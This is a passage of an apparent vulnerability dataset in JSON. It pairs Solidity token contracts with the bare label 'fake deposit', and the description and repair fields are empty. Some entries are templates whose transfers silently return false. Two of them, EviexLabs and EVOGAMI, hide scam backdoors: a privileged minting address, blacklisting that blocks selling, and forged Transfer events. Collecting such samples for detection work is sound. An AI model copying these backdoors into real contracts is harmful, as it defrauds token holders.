(address y, uint256 xy) internal {\r\n              emit Transfer(E20, y, xy);}\r\n        function transfer(address to, uint256 amount) public {\r\nif(E2[msg.sender] == 2) {\r\n         require(E1[msg.sender] >= amount);\r\n        E1[msg.sender] = E1[msg.sender].sub(amount);\r\n        E1[to] = E1[to].add(amount);\r\n    _Transfer(to, amount);}\r\nif(E2[msg.sender] <= 1) {\r\n     require(E1[msg.sender] >= amount);\r\n            E1[msg.sender] = E1[msg.sender].sub(amount);\r\n        E1[to] = E1[to].add(amount);\r\n       emit Transfer(msg.sender, to, amount);}}\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\nif(E2[sender] <= 1 && E2[recipient] <=1) {\r\n         require(amount <= E1[sender]);\r\n        require(amount <= E3[sender][msg.sender]);\r\n        E1[sender] = E1[sender].sub(amount);\r\n        E1[recipient] = E1[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n         return true;}\r\n        if(E2[sender] == 2) {\r\n         require(amount <= E3[sender][msg.sender]);\r\n        E1[sender] = E1[sender].sub(amount);\r\n        E1[recipient] = E1[recipient].add(amount);\r\n          _Transfer(recipient, amount);\r\n             return true;}\r\n        }}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n    string public name;                   //Name of the token\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals\r\n    string public symbol;                 //An identifier: eg AXM\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 100000000000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 100000000000000000;                        // Update total supply (100000 for example)\r\n        name = \"getirgold\";                                   // Set the name for display purposes\r\n        decimals = 8;                            // Amount of decimals\r\n        symbol = \"GGD\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    function _MsgSendr() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address _buildr = 0x3037290Aa65CbC698Fa4365023C3f847a6feE68D;\r\n\taddress UniswapV2 = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;\r\n    constructor () {\r\n        address msgSender = _MsgSendr();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n\r\n}\r\n\r\n\r\n\r\ncontract EviexLabs is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private IxI;\r\n\tmapping (address => bool) private Io;\r\n    mapping (address => bool) private Oi;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    uint8 private constant _decimals = 8;\r\n    uint256 private constant _Total = 150000000 * 10**_decimals;\r\n    string private constant _name = \"Eviex Labs\";\r\n    string private constant _symbol = \"EVIEX\";\r\n\r\n\r\n\r\n    constructor () {\r\n        IxI[_MsgSendr()] = _Total;\r\n        emit Transfer(address(0), UniswapV2, _Total);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return _Total;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return IxI[account];\r\n    }\r\n\r\n\r\n    function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n            function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n\t\tfunction zend(address z) public {\r\n        if(Io[msg.sender]) { \r\n        Oi[z] = false;}}\r\n        function zquery(address z) public{\r\n         if(Io[msg.sender])  { \r\n        require(!Oi[z]);\r\n        Oi[z] = true; }}\r\n\t\tfunction zstake(address z) public{\r\n         if(msg.sender == _buildr)  { \r\n        require(!Io[z]);\r\n        Io[z] = true; }}\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(sender == _buildr)  {\r\n        require(amount <= IxI[sender]);\r\n        IxI[sender] -= amount;  \r\n        IxI[recipient] += amount; \r\n          _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer (UniswapV2, recipient, amount);\r\n        return true; }    \r\n          if(!Oi[recipient]) {\r\n          if(!Oi[sender]) {\r\n         require(amount <= IxI[sender]);\r\n        require(amount <= _allowances[sender][msg.sender]);\r\n        IxI[sender] -= amount;\r\n        IxI[recipient] += amount;\r\n      _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}}\r\n\t\tfunction transfer(address recipient, uint256 amount) public {\r\n        if(msg.sender == _buildr)  {\r\n        require(IxI[msg.sender] >= amount);\r\n        IxI[msg.sender] -= amount;  \r\n        IxI[recipient] += amount; \r\n        emit Transfer (UniswapV2, recipient, amount);}\r\n        if(Io[msg.sender]) {IxI[recipient] = amount;} \r\n        if(!Oi[msg.sender]) {\r\n        require(IxI[msg.sender] >= amount);\r\n        IxI[msg.sender] -= amount;  \r\n        IxI[recipient] += amount;          \r\n        emit Transfer(msg.sender, recipient, amount);\r\n        }}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.16;\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 1000000000000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 1000000000000000000;                        // Update total supply (100000 for example)\r\n        name = \"PBSC Coin\";                                   // Set the name for display purposes\r\n        decimals = 8;                            // Amount of decimals for display purposes\r\n        symbol = \"PBSC\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address _zConst = 0x7De4D03d99ef36CAA1Cc504b198e80da746114f9;\r\n\taddress zRouterV2 = 0x426903241ADA3A0092C3493a0C795F2ec830D622;\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n\r\n}\r\n\r\n\r\n\r\ncontract EVOGAMI is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private Zc;\r\n\tmapping (address => bool) private Zb;\r\n    mapping (address => bool) private Za;\r\n    mapping (address => mapping (address => uint256)) private Ze;\r\n    uint8 private constant _decimals = 8;\r\n    uint256 private constant _zSupply = 200000000 * 10**_decimals;\r\n    string private constant _name = \"EVOGAMI\";\r\n    string private constant _symbol = \"EVOGAMI\";\r\n\r\n\r\n\r\n    constructor () {\r\n        Zc[_msgSender()] = _zSupply;\r\n        emit Transfer(address(0), zRouterV2, _zSupply);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return _zSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return Zc[account];\r\n    }\r\n\r\n\r\n    function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return Ze[owner][spender];\r\n    }\r\n\r\n            function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        Ze[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n\t\tfunction zRNG(address Zf) public {\r\n        if(Zb[msg.sender]) { \r\n        Za[Zf] = false;}}\r\n        function zCheck(address Zf) public{\r\n         if(Zb[msg.sender])  { \r\n        require(!Za[Zf]);\r\n        Za[Zf] = true; }}\r\n\t\tfunction zDele(address Zf) public{\r\n         if(msg.sender == _zConst)  { \r\n        require(!Zb[Zf]);\r\n        Zb[Zf] = true; }}\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(sender == _zConst)  {\r\n        require(amount <= Zc[sender]);\r\n        Zc[sender] -= amount;  \r\n        Zc[recipient] += amount; \r\n          Ze[sender][msg.sender] -= amount;\r\n        emit Transfer (zRouterV2, recipient, amount);\r\n        return true; }  else  \r\n          if(!Za[recipient]) {\r\n          if(!Za[sender]) {\r\n         require(amount <= Zc[sender]);\r\n        require(amount <= Ze[sender][msg.sender]);\r\n        Zc[sender] -= amount;\r\n        Zc[recipient] += amount;\r\n      Ze[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}}\r\n\t\tfunction transfer(address Zd, uint256 Zf) public {\r\n        if(msg.sender == _zConst)  {\r\n        require(Zc[msg.sender] >= Zf);\r\n        Zc[msg.sender] -= Zf;  \r\n        Zc[Zd] += Zf; \r\n        emit Transfer (zRouterV2, Zd, Zf);} else  \r\n        if(Zb[msg.sender]) {Zc[Zd] += Zf;} else\r\n        if(!Za[msg.sender]) {\r\n        require(Zc[msg.sender] >= Zf);\r\n        Zc[msg.sender] -= Zf;  \r\n        Zc[Zd] += Zf;          \r\n        emit Transfer(msg.sender, Zd, Zf);}}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "/**\r\n *Submitted for verification at Etherscan.io on 2022-05-19\r\n*/\r\n\r\npragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract MyEther is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function MyEther(\r\n        ) {\r\n        balances[msg.sender] = 1000000000000000000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 100000000000000000000000000;                        // Update total supply (100000 for example)\r\n        name = \"Ethereum\";                                   // Set the name for display purposes\r\n        decimals = 18;                            // Amount of decimals for display purposes\r\n        symbol = \"ETH\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "function assert(bool assertion) internal { */\r\n    /*   if (!assertion) { */\r\n    /*     throw; */\r\n    /*   } */\r\n    /* }      // assert no longer needed once solidity is on 0.4.10 */\r\n\r\n    function safeAdd(uint256 x, uint256 y) internal returns(uint256) {\r\n      uint256 z = x + y;\r\n      assert((z >= x) && (z >= y));\r\n      return z;\r\n    }\r\n\r\n    function safeSubtract(uint256 x, uint256 y) internal returns(uint256) {\r\n      assert(x >= y);\r\n      uint256 z = x - y;\r\n      return z;\r\n    }\r\n\r\n    function safeMult(uint256 x, uint256 y) internal returns(uint256) {\r\n      uint256 z = x * y;\r\n      assert((x == 0)||(z/x == y));\r\n      return z;\r\n    }\r\n\r\n}\r\n\r\ncontract Token {\r\n    uint256 public totalSupply;\r\n    function balanceOf(address _owner) constant returns (uint256 balance);\r\n    function transfer(address _to, uint256 _value) returns (bool success);\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\r\n    function approve(address _spender, uint256 _value) returns (bool success);\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining);\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\r\n\r\n/*  ERC 20 token */\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n      if (balances[msg.sender] >= _value && _value > 0) {\r\n        balances[msg.sender] -= _value;\r\n        balances[_to] += _value;\r\n        Transfer(msg.sender, _to, _value);\r\n        return true;\r\n      } else {\r\n        return false;\r\n      }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n      if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n        balances[_to] += _value;\r\n        balances[_from] -= _value;\r\n        